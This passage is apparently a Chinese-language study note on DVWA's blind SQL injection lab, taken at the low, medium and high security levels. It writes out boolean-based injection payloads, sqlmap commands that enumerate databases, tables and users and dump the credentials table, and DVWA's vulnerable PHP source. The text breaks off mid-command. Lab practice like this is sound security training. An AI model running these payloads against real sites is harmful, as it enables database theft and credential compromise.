![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753925080136-f94d4175-b0d8-4f91-8074-894867cf5475.png)

继续输入 1' and 1=2 # ，显示User ID is MISSING from the database.说明存在字符型的盲注。

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753925133536-7b4d0278-707e-4960-adac-d9b5605653fb.png)

猜数据库名

1'  and length(database())=1 #，显示User ID is MISSING from the database.，继续

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753926244880-6b803f40-2a61-401b-8cbf-3abd048c4129.png)

1'  and length(database())=2 #，显示User ID is MISSING from the database.，继续

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753926271078-9c8d8ed2-5856-4813-9b44-e2195e13163a.png)

1'  and length(database())=3 #，显示User ID is MISSING from the database.，继续

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753926309317-3d0d94be-0717-4b3e-97cb-8c32d80d0202.png)

1'  and length(database())=4 #，显示User ID exists in the database.，说明数据库名长度为4续

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753926328592-9e3bb19a-6ffa-4d69-bc25-91a70cf62e5b.png)

已知数据库名长度，继续猜解数据库名，这里会用到二分法，有点类似枚举法。

1’ and ascii(substr(database(),1,1))>97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1753926433785-95802f48-cdb7-4af1-b205-385304a58708.png)

ASCII 对应表：

| **<font style="color:rgb(51, 51, 51);">ASCII 码</font>** | | **<font style="color:rgb(51, 51, 51);">字符</font>** | **<font style="color:rgb(51, 51, 51);">   </font>** | **<font style="color:rgb(51, 51, 51);">ASCII 码</font>** | | **<font style="color:rgb(51, 51, 51);">字符</font>** | **<font style="color:rgb(51, 51, 51);">   </font>** | **<font style="color:rgb(51, 51, 51);">ASCII 码</font>** | | **<font style="color:rgb(51, 51, 51);">字符</font>** | **<font style="color:rgb(51, 51, 51);">   </font>** | **<font style="color:rgb(51, 51, 51);">ASCII 码</font>** | **<font style="color:rgb(51, 51, 51);">字符</font>** |
| :---: | --- | :---: | :---: | :---: | --- | :---: | :---: | :---: | --- | :---: | :---: | :---: | :---: |
| **<font style="color:rgb(51, 51, 51);">十进位</font>** | **<font style="color:rgb(51, 51, 51);">十六进位</font>** | | **<font style="color:rgb(51, 51, 51);">   </font>** | **<font style="color:rgb(51, 51, 51);">十进位</font>** | **<font style="color:rgb(51, 51, 51);">十六进位</font>** | | **<font style="color:rgb(51, 51, 51);">   </font>** | **<font style="color:rgb(51, 51, 51);">十进位</font>** | **<font style="color:rgb(51, 51, 51);">十六进位</font>** | | **<font style="color:rgb(51, 51, 51);">   </font>** | **<font style="color:rgb(51, 51, 51);">十进位</font>** | **<font style="color:rgb(51, 51, 51);">十六进位</font>** |
| <font style="color:rgb(51, 51, 51);">032</font> | <font style="color:rgb(51, 51, 51);">20</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">056</font> | <font style="color:rgb(51, 51, 51);">38</font> | <font style="color:rgb(51, 51, 51);">8</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">080</font> | <font style="color:rgb(51, 51, 51);">50</font> | <font style="color:rgb(51, 51, 51);">P</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">104</font> | <font style="color:rgb(51, 51, 51);">68</font> | <font style="color:rgb(51, 51, 51);">h</font> |
| <font style="color:rgb(51, 51, 51);">033</font> | <font style="color:rgb(51, 51, 51);">21</font> | <font style="color:rgb(51, 51, 51);">!</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">057</font> | <font style="color:rgb(51, 51, 51);">39</font> | <font style="color:rgb(51, 51, 51);">9</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">081</font> | <font style="color:rgb(51, 51, 51);">51</font> | <font style="color:rgb(51, 51, 51);">Q</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">105</font> | <font style="color:rgb(51, 51, 51);">69</font> | <font style="color:rgb(51, 51, 51);">i</font> |
| <font style="color:rgb(51, 51, 51);">034</font> | <font style="color:rgb(51, 51, 51);">22</font> | <font style="color:rgb(51, 51, 51);">"</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">058</font> | <font style="color:rgb(51, 51, 51);">3A</font> | <font style="color:rgb(51, 51, 51);">:</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">082</font> | <font style="color:rgb(51, 51, 51);">52</font> | <font style="color:rgb(51, 51, 51);">R</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">106</font> | <font style="color:rgb(51, 51, 51);">6A</font> | <font style="color:rgb(51, 51, 51);">j</font> |
| <font style="color:rgb(51, 51, 51);">035</font> | <font style="color:rgb(51, 51, 51);">23</font> | <font style="color:rgb(51, 51, 51);">#</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">059</font> | <font style="color:rgb(51, 51, 51);">3B</font> | <font style="color:rgb(51, 51, 51);">;</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">083</font> | <font style="color:rgb(51, 51, 51);">53</font> | <font style="color:rgb(51, 51, 51);">S</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">107</font> | <font style="color:rgb(51, 51, 51);">6B</font> | <font style="color:rgb(51, 51, 51);">k</font> |
| <font style="color:rgb(51, 51, 51);">036</font> | <font style="color:rgb(51, 51, 51);">24</font> | <font style="color:rgb(51, 51, 51);">$</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">060</font> | <font style="color:rgb(51, 51, 51);">3C</font> | <font style="color:rgb(51, 51, 51);"><</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">084</font> | <font style="color:rgb(51, 51, 51);">54</font> | <font style="color:rgb(51, 51, 51);">T</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">108</font> | <font style="color:rgb(51, 51, 51);">6C</font> | <font style="color:rgb(51, 51, 51);">l</font> |
| <font style="color:rgb(51, 51, 51);">037</font> | <font style="color:rgb(51, 51, 51);">25</font> | <font style="color:rgb(51, 51, 51);">%</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">061</font> | <font style="color:rgb(51, 51, 51);">3D</font> | <font style="color:rgb(51, 51, 51);">=</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">085</font> | <font style="color:rgb(51, 51, 51);">55</font> | <font style="color:rgb(51, 51, 51);">U</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">109</font> | <font style="color:rgb(51, 51, 51);">6D</font> | <font style="color:rgb(51, 51, 51);">m</font> |
| <font style="color:rgb(51, 51, 51);">038</font> | <font style="color:rgb(51, 51, 51);">26</font> | <font style="color:rgb(51, 51, 51);">&</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">062</font> | <font style="color:rgb(51, 51, 51);">3E</font> | <font style="color:rgb(51, 51, 51);">></font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">086</font> | <font style="color:rgb(51, 51, 51);">56</font> | <font style="color:rgb(51, 51, 51);">V</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">110</font> | <font style="color:rgb(51, 51, 51);">6E</font> | <font style="color:rgb(51, 51, 51);">n</font> |
| <font style="color:rgb(51, 51, 51);">039</font> | <font style="color:rgb(51, 51, 51);">27</font> | <font style="color:rgb(51, 51, 51);">'</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">063</font> | <font style="color:rgb(51, 51, 51);">3F</font> | <font style="color:rgb(51, 51, 51);">?</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">087</font> | <font style="color:rgb(51, 51, 51);">57</font> | <font style="color:rgb(51, 51, 51);">W</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">111</font> | <font style="color:rgb(51, 51, 51);">6F</font> | <font style="color:rgb(51, 51, 51);">o</font> |
| <font style="color:rgb(51, 51, 51);">040</font> | <font style="color:rgb(51, 51, 51);">28</font> | <font style="color:rgb(51, 51, 51);">(</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">064</font> | <font style="color:rgb(51, 51, 51);">40</font> | <font style="color:rgb(51, 51, 51);">@</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">088</font> | <font style="color:rgb(51, 51, 51);">58</font> | <font style="color:rgb(51, 51, 51);">X</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">112</font> | <font style="color:rgb(51, 51, 51);">70</font> | <font style="color:rgb(51, 51, 51);">p</font> |
| <font style="color:rgb(51, 51, 51);">041</font> | <font style="color:rgb(51, 51, 51);">29</font> | <font style="color:rgb(51, 51, 51);">)</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">065</font> | <font style="color:rgb(51, 51, 51);">41</font> | <font style="color:rgb(51, 51, 51);">A</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">089</font> | <font style="color:rgb(51, 51, 51);">59</font> | <font style="color:rgb(51, 51, 51);">Y</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">113</font> | <font style="color:rgb(51, 51, 51);">71</font> | <font style="color:rgb(51, 51, 51);">q</font> |
| <font style="color:rgb(51, 51, 51);">042</font> | <font style="color:rgb(51, 51, 51);">2A</font> | <font style="color:rgb(51, 51, 51);">*</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">066</font> | <font style="color:rgb(51, 51, 51);">42</font> | <font style="color:rgb(51, 51, 51);">B</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">090</font> | <font style="color:rgb(51, 51, 51);">5A</font> | <font style="color:rgb(51, 51, 51);">Z</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">114</font> | <font style="color:rgb(51, 51, 51);">72</font> | <font style="color:rgb(51, 51, 51);">r</font> |
| <font style="color:rgb(51, 51, 51);">043</font> | <font style="color:rgb(51, 51, 51);">2B</font> | <font style="color:rgb(51, 51, 51);">+</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">067</font> | <font style="color:rgb(51, 51, 51);">43</font> | <font style="color:rgb(51, 51, 51);">C</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">091</font> | <font style="color:rgb(51, 51, 51);">5B</font> | <font style="color:rgb(51, 51, 51);">[</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">115</font> | <font style="color:rgb(51, 51, 51);">73</font> | <font style="color:rgb(51, 51, 51);">s</font> |
| <font style="color:rgb(51, 51, 51);">044</font> | <font style="color:rgb(51, 51, 51);">2C</font> | <font style="color:rgb(51, 51, 51);">,</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">068</font> | <font style="color:rgb(51, 51, 51);">44</font> | <font style="color:rgb(51, 51, 51);">D</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">092</font> | <font style="color:rgb(51, 51, 51);">5C</font> | <font style="color:rgb(51, 51, 51);">\</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">116</font> | <font style="color:rgb(51, 51, 51);">74</font> | <font style="color:rgb(51, 51, 51);">t</font> |
| <font style="color:rgb(51, 51, 51);">045</font> | <font style="color:rgb(51, 51, 51);">2D</font> | <font style="color:rgb(51, 51, 51);">-</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">069</font> | <font style="color:rgb(51, 51, 51);">45</font> | <font style="color:rgb(51, 51, 51);">E</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">093</font> | <font style="color:rgb(51, 51, 51);">5D</font> | <font style="color:rgb(51, 51, 51);">]</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">117</font> | <font style="color:rgb(51, 51, 51);">75</font> | <font style="color:rgb(51, 51, 51);">u</font> |
| <font style="color:rgb(51, 51, 51);">046</font> | <font style="color:rgb(51, 51, 51);">2E</font> | <font style="color:rgb(51, 51, 51);">.</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">070</font> | <font style="color:rgb(51, 51, 51);">46</font> | <font style="color:rgb(51, 51, 51);">F</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">094</font> | <font style="color:rgb(51, 51, 51);">5E</font> | <font style="color:rgb(51, 51, 51);">^</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">118</font> | <font style="color:rgb(51, 51, 51);">76</font> | <font style="color:rgb(51, 51, 51);">v</font> |
| <font style="color:rgb(51, 51, 51);">047</font> | <font style="color:rgb(51, 51, 51);">2F</font> | <font style="color:rgb(51, 51, 51);">/</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">071</font> | <font style="color:rgb(51, 51, 51);">47</font> | <font style="color:rgb(51, 51, 51);">G</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">095</font> | <font style="color:rgb(51, 51, 51);">5F</font> | <font style="color:rgb(51, 51, 51);">_</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">119</font> | <font style="color:rgb(51, 51, 51);">77</font> | <font style="color:rgb(51, 51, 51);">w</font> |
| <font style="color:rgb(51, 51, 51);">048</font> | <font style="color:rgb(51, 51, 51);">30</font> | <font style="color:rgb(51, 51, 51);">0</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">072</font> | <font style="color:rgb(51, 51, 51);">48</font> | <font style="color:rgb(51, 51, 51);">H</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">096</font> | <font style="color:rgb(51, 51, 51);">60</font> | <font style="color:rgb(51, 51, 51);">`</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">120</font> | <font style="color:rgb(51, 51, 51);">78</font> | <font style="color:rgb(51, 51, 51);">x</font> |
| <font style="color:rgb(51, 51, 51);">049</font> | <font style="color:rgb(51, 51, 51);">31</font> | <font style="color:rgb(51, 51, 51);">1</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">073</font> | <font style="color:rgb(51, 51, 51);">49</font> | <font style="color:rgb(51, 51, 51);">I</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">097</font> | <font style="color:rgb(51, 51, 51);">61</font> | <font style="color:rgb(51, 51, 51);">a</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">121</font> | <font style="color:rgb(51, 51, 51);">79</font> | <font style="color:rgb(51, 51, 51);">y</font> |
| <font style="color:rgb(51, 51, 51);">050</font> | <font style="color:rgb(51, 51, 51);">32</font> | <font style="color:rgb(51, 51, 51);">2</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">074</font> | <font style="color:rgb(51, 51, 51);">4A</font> | <font style="color:rgb(51, 51, 51);">J</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">098</font> | <font style="color:rgb(51, 51, 51);">62</font> | <font style="color:rgb(51, 51, 51);">b</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">122</font> | <font style="color:rgb(51, 51, 51);">7A</font> | <font style="color:rgb(51, 51, 51);">z</font> |
| <font style="color:rgb(51, 51, 51);">051</font> | <font style="color:rgb(51, 51, 51);">33</font> | <font style="color:rgb(51, 51, 51);">3</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">075</font> | <font style="color:rgb(51, 51, 51);">4B</font> | <font style="color:rgb(51, 51, 51);">K</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">099</font> | <font style="color:rgb(51, 51, 51);">63</font> | <font style="color:rgb(51, 51, 51);">c</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">123</font> | <font style="color:rgb(51, 51, 51);">7B</font> | <font style="color:rgb(51, 51, 51);">{</font> |
| <font style="color:rgb(51, 51, 51);">052</font> | <font style="color:rgb(51, 51, 51);">34</font> | <font style="color:rgb(51, 51, 51);">4</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">076</font> | <font style="color:rgb(51, 51, 51);">4C</font> | <font style="color:rgb(51, 51, 51);">L</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">100</font> | <font style="color:rgb(51, 51, 51);">64</font> | <font style="color:rgb(51, 51, 51);">d</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">124</font> | <font style="color:rgb(51, 51, 51);">7C</font> | <font style="color:rgb(51, 51, 51);">|</font> |
| <font style="color:rgb(51, 51, 51);">053</font> | <font style="color:rgb(51, 51, 51);">35</font> | <font style="color:rgb(51, 51, 51);">5</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">077</font> | <font style="color:rgb(51, 51, 51);">4D</font> | <font style="color:rgb(51, 51, 51);">M</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">101</font> | <font style="color:rgb(51, 51, 51);">65</font> | <font style="color:rgb(51, 51, 51);">e</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">125</font> | <font style="color:rgb(51, 51, 51);">7D</font> | <font style="color:rgb(51, 51, 51);">}</font> |
| <font style="color:rgb(51, 51, 51);">054</font> | <font style="color:rgb(51, 51, 51);">36</font> | <font style="color:rgb(51, 51, 51);">6</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">078</font> | <font style="color:rgb(51, 51, 51);">4E</font> | <font style="color:rgb(51, 51, 51);">N</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">102</font> | <font style="color:rgb(51, 51, 51);">66</font> | <font style="color:rgb(51, 51, 51);">f</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">126</font> | <font style="color:rgb(51, 51, 51);">7E</font> | <font style="color:rgb(51, 51, 51);">~</font> |
| <font style="color:rgb(51, 51, 51);">055</font> | <font style="color:rgb(51, 51, 51);">37</font> | <font style="color:rgb(51, 51, 51);">7</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">079</font> | <font style="color:rgb(51, 51, 51);">4F</font> | <font style="color:rgb(51, 51, 51);">O</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">103</font> | <font style="color:rgb(51, 51, 51);">67</font> | <font style="color:rgb(51, 51, 51);">g</font> | <font style="color:rgb(51, 51, 51);">   </font> | <font style="color:rgb(51, 51, 51);">127</font> | <font style="color:rgb(51, 51, 51);">7F</font> | <font style="color:rgb(51, 51, 51);">DEL</font> |


猜！

```plain
1' AND ascii(substr(database(),1,1)) < 100 #
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754284926372-eb50c618-21be-4621-a401-bbb89d4ae687.png)

```plain
1' AND ascii(substr(database(),1,1)) < 101 #
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754284964827-0070cac5-b332-4122-9780-8c5a7e20c730.png)

说明是100 d 同理推测接下来的得到dvwa

但是我现在打算用sqlmap去做了！

burpsuite抓包

获得信息：

GET /DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit HTTP/1.1

Cookie: PHPSESSID=8817313ac8f5f877050ea1b622643c59; security=low

构造命令判断是否存在注入点、注入的类型：

```plain
python2 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=8817313ac8f5f877050ea1b622643c59" --batch
```

得到信息

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754370923382-28c7a69c-bc3e-4123-ae63-4278da798c0d.png)

参数位置：GET 参数 id 存在 SQL 注入漏洞

漏洞类型：

布尔盲注 (Boolean-based blind)

时间盲注 (Time-based blind)

数据库环境：

数据库类型：MySQL（MariaDB 分支，版本 ≥ 5.0.12）

操作系统：Linux Debian

Web 服务：Apache 2.4.64

应用技术：DVWA（Damn Vulnerable Web Application）

构造命令获取DBMS中所有的数据库名称：

```plain
python2 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=8817313ac8f5f877050ea1b622643c59" --batch --dbs
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754371197450-04450f5b-251c-4edc-b25b-4158b1f0e7dd.png)

获取Web应用当前连接的数据库

```plain
python2 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=8817313ac8f5f877050ea1b622643c59" --batch --current-db
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754371521845-c5165234-7c91-4f5c-8004-e6f65199ad00.png)

列出数据库中的所有用户

```plain
python2 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=8817313ac8f5f877050ea1b622643c59" --batch --users
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754371667550-290f74ef-285a-4ef0-a355-69a41f05bd73.png)

获取Web应用当前所操作的用户

```plain
python2 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=8817313ac8f5f877050ea1b622643c59" --batch --current-user
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754371995117-b58170e4-72a5-4bf7-8686-d62e05d790c4.png)

提取应用程序数据库中的用户凭证

```plain
python2 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" \
--cookie="security=low; PHPSESSID=8817313ac8f5f877050ea1b622643c59" \
--batch \
--dump -D dvwa -T users
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754372377295-3477a8b8-2aab-4c76-b13b-ed0ca1607b73.png)

sqlmap还可以自动识别破解MD5哈希密码，神奇

列出指定数据库中的所有数据表

```plain
python2 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=8817313ac8f5f877050ea1b622643c59" --batch -D dvwa --tables
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754372479824-11fc5051-1816-4d9c-880a-edd2b9e8586f.png)

列出指定数据表中的所有字段（列）

```plain
python2 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=8817313ac8f5f877050ea1b622643c59" --batch -D dvwa -T users --columns
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754372558341-3652f00d-6f88-435d-acd2-985fa24a7d26.png)

导出指定数据表中的列字段进行保存

```plain
python2 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=8817313ac8f5f877050ea1b622643c59" --batch -D dvwa -T users -C "user,password" --dump
```

### ![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754372687351-8412ac67-a7a6-40d1-b7c9-ceda56c44219.png)
### 难度medium
审计代码

```plain
<?php

if(isset($_POST['Submit'])){
    // Get input
    $id = $_POST['id'];
    $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if($num > 0){
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    //mysql_close();
}

?> 
```

源码使用了 mysql_real_escape_string() 函数转义字符串中的特殊字符。也就是说特殊符号 \x00、\n、\r、\、'、" 和 \x1a 都将进行转义。同时把前端页面的输入框删了，改成了下拉选择表单。单引号在中级别的代码中被过滤了，可以使用 ASCII 码的值来代替原来单引号括起来的字符。MySql 的 ASCII() 函数把字符转换成 ascii 码值。Low等级提交的数据是通过GET请求方式，直接在浏览器url中传递参数；而Medium等级，所提交的User ID数据是通过POST请求方式，参数是在POST请求体中传递。此时，构造SQLMap操作命令，则需要将url和data分成两部分分别填写，同时需要更新cookie信息的取值。

burpsuite

POST /DVWA/vulnerabilities/sqli_blind/ HTTP/1.1

Cookie: PHPSESSID=8817313ac8f5f877050ea1b622643c59; security=medium

构造命令判断是否存在注入点、注入的类型：

```plain
python2 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli_blind/" --data="id=1&Submit=Submit" --cookie="security=medium; PHPSESSID=8817313ac8f5f877050ea1b622643c59" --batch
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754373617986-f70e837e-9895-4524-a93e-abcd07935fd1.png)

构造命令获取DBMS中所有的数据库名称：

```plain
python2 sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli_blind/" --data="id=1&Submit=Submit" --cookie="security=medium; PHPSESSID=8817313ac8f5f877050ea1b622643c59" --batch -dbs
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754373704301-3b7d2816-b53b-46d9-bf59-0781c360db7d.png)

不一一操作了，和难度low操作基本是相同的

### 难度high
审计代码

```plain
<?php

if(isset($_COOKIE['id'])){
    // Get input
    $id = $_COOKIE['id'];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if($num > 0){
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Might sleep a random amount
        if(rand(0, 5) == 3){
            sleep(rand( 2, 4));
        }

        // User wasn't found, so the page wasn't!
        header($_SERVER[ 'SERVER_PROTOCOL'] . ' 404 Not Found');

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```

High 级别的只是在 SQL 查询语句中添加了 LIMIT 1，这令服务器仅回显查询到的一个结果。同时源码利用了 cookie 传递参数 id，当 SQL 查询结果为空时会执行函数 sleep()，这是为了混淆基于时间的盲注的响应时间判断。

High级别的查询数据提交的页面、查询结果显示的页面是分离成了2个不同的窗口分别控制的。即在查询提交窗口提交数据（POST请求）之后，需要到另外一个窗口进行查看结果（GET请求）。若需获取请求体中的Form Data数据，则需要在提交数据的窗口中查看网络请求数据or通过拦截工具获取。

High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止常规的SQLMap扫描注入测试，因为SQLMap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入；但是并不代表High级别不能用SQLMap进行注入测试，此时需要利用其非常规的命令联合操作，如：--second-url="xxxurl"（设置二阶响应的结果显示页面的url）

burpsuite抓包

GET /DVWA/vulnerabilities/sqli_blind/cookie-input.php HTTP/1.1

POST /DVWA/vulnerabilities/sqli_blind/cookie-input.php HTTP/1.1

Cookie: id=1; PHPSESSID=8817313ac8f5f877050ea1b622643c59; security=high

构造命令判断是否存在注入点、注入的类型：

```plain
python2 sqlmap.py --url="http://localhost/DVWA/vulnerabilities/sqli_blind/cookie-input.php" --data="id=1&Submit=Submit" --second-url="http://localhost/DVWA/vulnerabilities/sqli_blind/" --cookie="id=1; security=high; PHPSESSID=8817313ac8f5f877050ea1b622643c59" --batch
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754377901306-2b0ddb0c-0ffd-4a6a-bd8e-3cda59c29df5.png)

还是可以注入的呢

构造命令获取DBMS中所有的数据库名称：

```plain
python2 sqlmap.py \
  -u "http://localhost/DVWA/vulnerabilities/sqli_blind/" \
  --data="id=1&Submit=Submit" \
  --cookie="id=1; security=high; PHPSESSID=8817313ac8f5f877050ea1b622643c59" \
